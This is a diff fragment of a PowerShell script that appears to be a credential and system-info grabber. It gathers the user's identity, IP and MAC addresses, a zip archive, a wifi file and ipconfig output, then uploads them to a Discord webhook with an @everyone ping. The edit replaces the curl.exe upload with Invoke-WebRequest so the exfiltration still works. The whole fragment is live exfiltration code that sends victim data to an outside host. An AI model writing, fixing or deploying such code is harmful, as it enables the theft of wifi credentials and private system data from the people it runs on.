@@ -35,14 +35,12 @@ $info    = "IPS: $($ipv4 -join ', ') | MACS: $($mac -join ', ') | IPv6: $($ipv6 
 $content = "$($whoami_content) | $info | @everyone"
 
 Write-Output about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt
-Start-Process curl.exe -ArgumentList @(
-    '-X', 'POST',
-    '-F', "content=$content",
-    '-F', "file1=@$zip",
-    '-F', "file2=@$wifiFile",
-    '-F', "file3=@$e\ipcfg.txt",
-    $wh
-) -Wait *> $null
+Invoke-WebRequest -Uri $wh -Method POST -Form @{
+    content = $content
+    file1 = Get-Item $zip
+    file2 = Get-Item $wifiFile
+    file3 = Get-Item "$e\ipcfg.txt"
+}
 Write-Output sent to discord
 # cleanup
 #cls
